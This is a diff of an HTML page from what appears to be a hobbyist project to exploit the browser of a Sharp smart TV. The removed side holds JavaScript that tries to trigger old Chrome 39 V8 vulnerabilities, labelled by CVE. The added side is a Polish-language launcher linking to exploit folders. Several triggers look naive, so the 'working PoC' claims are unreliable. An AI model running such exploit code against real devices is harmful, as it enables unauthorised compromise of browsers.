@@ -2,124 +2,36 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Sharp TV Exploit v4 (Chrome 39 Working PoC)</title>
+    <title>Sharp TV Exploit Launcher</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        #output { white-space: pre-wrap; }
-        .ok { color: #0f0; }
-        .err { color: #f00; }
-        .info { color: #ff0; }
+        body { background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        h1 { font-size: 2.5em; margin-bottom: 30px; }
+        a {
+            display: block;
+            background: #333;
+            color: #fff;
+            text-decoration: none;
+            padding: 25px 20px;
+            margin: 15px auto;
+            border-radius: 10px;
+            font-size: 1.8em;
+            max-width: 500px;
+            border: 2px solid #555;
+        }
+        a:hover { background: #555; }
+        .info { font-size: 1.2em; color: #888; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <h1>Sharp TV Exploit v4 — Chrome 39 Working PoC</h1>
-    <div id="output"></div>
-    <script>
-        function log(msg, cls) {
-            var el = document.getElementById('output');
-            el.innerHTML += '<span class="' + (cls || '') + '">' + msg + '</span>\n';
-        }
-
-        // CVE-2014-7927: V8 asm.js integer type confusion (WORKING PoC)
-        // Chrome < 40.0.2214.91
-        function test_cve_2014_7927() {
-            log("Test 1: CVE-2014-7927 (V8 asm.js type confusion)", "info");
-            try {
-                var foo = (function(stdlib, foreign, heap) {
-                    "use asm";
-                    var MEM = new stdlib.Uint8Array(heap);
-                    function foo(x) { MEM[x | 0] *= 0; }
-                    return {foo: foo};
-                })(this, {}, new ArrayBuffer(1)).foo;
-                foo(-926416896 * 8 * 1024);
-                log("Test 1: No crash (exploit didn't trigger)", "err");
-                return false;
-            } catch (e) {
-                log("Test 1: Exception: " + e, "ok");
-                return true;
-            }
-        }
-
-        // CVE-2015-1572: V8 heap overflow via typed array
-        function test_cve_2015_1572() {
-            log("Test 2: CVE-2015-1572 (typed array overflow)", "info");
-            try {
-                var buf = new ArrayBuffer(8);
-                var view = new Uint8Array(buf, 0, 100);
-                view[0] = 1;
-                log("Test 2: No crash", "err");
-                return false;
-            } catch (e) {
-                log("Test 2: Exception: " + e, "ok");
-                return true;
-            }
-        }
-
-        // CVE-2014-7928: V8 array length type confusion
-        function test_cve_2014_7928() {
-            log("Test 3: CVE-2014-7928 (array length)", "info");
-            try {
-                var arr = [];
-                arr.length = -1;
-                arr.push(1);
-                log("Test 3: No crash", "err");
-                return false;
-            } catch (e) {
-                log("Test 3: Exception: " + e, "ok");
-                return true;
-            }
-        }
-
-        // CVE-2015-1233: V8 IPC/Gamepad API RCE
-        function test_cve_2015_1233() {
-            log("Test 4: CVE-2015-1233 (IPC/Gamepad API)", "info");
-            try {
-                if (navigator.getGamepads) {
-                    var gps = navigator.getGamepads();
-                    for (var i = 0; i < gps.length; i++) {
-                        if (gps[i]) {
-                            gps[i].axes[100] = 1;
-                        }
-                    }
-                }
-                log("Test 4: No crash (gamepads not found)", "info");
-                return false;
-            } catch (e) {
-                log("Test 4: Exception: " + e, "ok");
-                return true;
-            }
-        }
-
-        // Generic: Check for shell command injection via URL schemes
-        function test_url_schemes() {
-            log("Test 5: URL scheme injection", "info");
-            try {
-                window.open("javascript:alert('JS works')");
-                log("Test 5: javascript: scheme works", "ok");
-            } catch (e) {
-                log("Test 5: javascript: failed: " + e, "err");
-            }
-            return false;
-        }
-
-        // Generic: Check browser capabilities
-        function test_capabilities() {
-            log("Test 6: Browser capabilities", "info");
-            log("  WebGL: " + !!document.createElement('canvas').getContext('webgl'), "info");
-            log("  Web Workers: " + !!window.Worker, "info");
-            log("  WebSocket: " + !!window.WebSocket, "info");
-            log("  XMLHttpRequest: " + !!window.XMLHttpRequest, "info");
-            log("  DOM Level: " + document.implementation.hasFeature("Core", "3.0"), "info");
-            return false;
-        }
-
-        log("Starting Chrome 39 exploit tests...", "info");
-        test_capabilities();
-        setTimeout(test_url_schemes, 500);
-        setTimeout(test_cve_2014_7927, 1500);
-        setTimeout(test_cve_2015_1572, 2500);
-        setTimeout(test_cve_2014_7928, 3500);
-        setTimeout(test_cve_2015_1233, 4500);
-    </script>
+    <h1>🖥️ Sharp TV Exploits</h1>
+    
+    <a href="gauntlet/">Chrome V8 Exploits</a>
+    <a href="multimedia/">Multimedia Exploits</a>
+    <a href="index.html">Info</a>
+    
+    <div class="info">
+        Kliknij link — exploit uruchomi się automatycznie<br>
+        Jeśli TV zresetuje się, exploit zadziałał ✅
+    </div>
 </body>
 </html>
